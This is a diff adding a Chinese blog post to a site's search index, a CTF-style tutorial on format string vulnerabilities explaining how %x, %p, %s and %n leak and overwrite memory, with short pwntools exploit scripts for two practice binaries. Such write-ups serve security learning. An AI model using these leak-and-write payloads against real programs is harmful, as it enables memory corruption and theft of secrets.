@@ -2992,4 +2992,67 @@
 </blockquote>
 ]]></content>
   </entry>
+  <entry>
+    <title>格式化字符串</title>
+    <url>/2024/11/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p>格式化字符串是个按部就班的人，直接打印的时候，不管给没给参数，他会按照参数的规则，打印出字符串中给的格式化字符，不管这个参数危不危险</p>
+<p>格式化字符串比较长，不太好直接给printf参数。所以printf中的参数其实是格式化字符串的地址。所以当格式化字符串本身含有某个地址的时候，可以将这个地址的内容打印出来</p>
+<p>于是我们顺着这个地址可以找到真正的字符串在哪里，接着计算地址和字符串的偏移量，从而通过控制格式化字符串达到任意地址读写</p>
+<p><strong>格式化字符串存在于栈上，导致我们可以在栈上写入任意数据，导致我们可以泄露任意地址的内存。还可以篡改进程空间中的内容</strong></p>
+<p><strong>总之，允许我们任意读写地址上的内容</strong></p>
+<p><strong>要求：有printf函数，且函数第一个参数可以控制</strong></p>
+<p>%x：将栈上的printf函数的参数以十六进制的形式打印出来。且前方不加0x</p>
+<p>%p：将栈上的数据当作指针输出。比起%x多了0x。可以基于此绕过canary</p>
+<p>%s： 栈上存放的是字符串的起始位置，解析这个地址，并把内容打印出来直到遇见‘ \0 ’。可以引发字符串截断漏洞。</p>
+<p>总之，%x 或 %p 直接把栈上内容打印出来，%s把栈上内容作为指针并把指向的内容打印出来。</p>
+<p>由于可以%s解引用，所以这里不再局限于泄露栈上的数据，而是可以泄露任何地址的内存。比如可以泄露got表的内容。</p>
+<p>%n：特性和%s相似，可以把栈上的内容看作地址进行解析。但它的作用是向被解析的地址（栈中数据指向的地址）中写入内容 。内容为格式化字符串前方（%n前方）已经打印成功的字符的个数。 输入的数据是一个四字节的整数，也就是int类型。</p>
+<p>如果要求写入数据较大的话，可以设置字符宽度。空格也算字符</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> c =<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%20c&quot;</span>,c)</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cccc%6hn&quot;</span>)</span><br><span class="line"><span class="comment">//这样会将输入的int类型改为short类型。即输入0x0004</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cccc%6hhn&quot;</span>)</span><br><span class="line"><span class="comment">//这样可以写入一个字节，0x04</span></span><br></pre></td></tr></table></figure>
+<p>（除了泄露还有篡改）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250324134337963.png" alt="image-20250324134337963" style="zoom:50%;"></p>
+<h4 id="s技巧"><a href="#s技巧" class="headerlink" title="%s技巧"></a>%s技巧</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c);</span><br></pre></td></tr></table></figure>
+<p>这时会把第三个参数打印出来</p>
+<p>所以当flag距离printf函数很远的时候，这样写就可以了</p>
+<p>x86中，这个参数（第一个参数 ，也就是格式化字符串），存放在栈上。所以存放的第一个参数其实是个地址，那么读取第一个参数的时候实际上需要解析。</p>
+<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>我们输入的格式化字符串如下。此时它将解析第六个参数。我们知道格式化字符串存放在栈中，于是可以通过在格式化字符串中写入地址的方式泄露任意地址的内容。图中我们找到地址在栈中的位置，并计算得到距离格式化字符串有8个双字，即是第六个参数。再通过%s打印指定地址的内容。</p>
+<p>一般我们通过此得到函数got表地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250324192033600.png" alt="image-20250324192033600" style="zoom:67%;"></p>
+<p>（图中字符串不应该出现00，不然会发生字符串截断） </p>
+<h5 id="实际例子"><a href="#实际例子" class="headerlink" title="实际例子"></a>实际例子</h5><p>可以看到，格式化字符串被存放在0xffffd1c8中, 第一个参数是0xffffd1bc，也就是格式化字符串的地址。我们可以精心构造格式化字符串，并计算其是第几个参数。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250324193144647.png" alt="image-20250324193144647"></p>
+<h5 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h5><p>这样就会将0x80522004的内容修改为4</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250324195706795.png" alt="image-20250324195706795" style="zoom:50%;"></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="fmtstr1"><a href="#fmtstr1" class="headerlink" title="fmtstr1"></a>fmtstr1</h3><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250324203251347.png" alt="image-20250324203251347" style="zoom:50%;"></p>
+<p>可以看到，打印的数据buf是我们自己传递的，完全可控，存在格式化字符串漏洞。</p>
+<p>我i们需要设置x的值为4。找到x的地址为0x804a02c，默认值为3</p>
+<p>接着进行动态调试，计算参数位置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250324203222059.png" alt="image-20250324203222059" style="zoom:67%;"></p>
+<p>所以是格式化字符串的第11个参数</p>
+<p>计算：(0xddc-0xdb4)  转化为10进制后除以4 并 +1。得到的数为参数的位置。</p>
+<p>加1是因为格式化字符串本身算一个参数。格式化字符串的第一个参数是printf的第二个参数……</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os= <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./fmtstr1&quot;</span>)</span><br><span class="line">x_addr = <span class="number">0x0804a02c</span></span><br><span class="line"><span class="comment">#the distance between fmtstr and the first parameter is 0x28 (40)</span></span><br><span class="line"></span><br><span class="line">fmtstr_payload = p32(x_addr) + <span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(fmtstr_payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="frmstr2"><a href="#frmstr2" class="headerlink" title="frmstr2"></a>frmstr2</h3><p>发现是64位程序</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250325211915368.png" alt="image-20250325211915368"></p>
+<p>需要输入正确的flag，这样就会给flag。。。</p>
+<p>同样格式化字符串，考虑用%s泄露flag</p>
+<p>题中可以看到，从文件读取到的flag数组储存在栈上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250325211004767.png" alt="image-20250325211004767" style="zoom: 50%;"></p>
+<p>m的意思是动态分配内存空间</p>
+<p>使用动态调试</p>
+<p>发现写入的格式化字符串存在堆中。但这没有关系，因为我们需要泄露的是栈上的地址。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250325212214657.png" alt="image-20250325212214657"></p>
+<p>回忆一下64位是怎么传递参数的。先将前六个参数传入寄存器中，再读取栈中的数据</p>
+<p>第一个参数自然是输入的格式化字符串AAAAAAAA，然后从第下面开始是第七个参数。所以flag是第九个参数。实战中也可以通过连续输入大量%p来找到对应参数偏移</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os= <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./goodluck&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%9$s&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>注意是send而不是sendline</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
 </search>
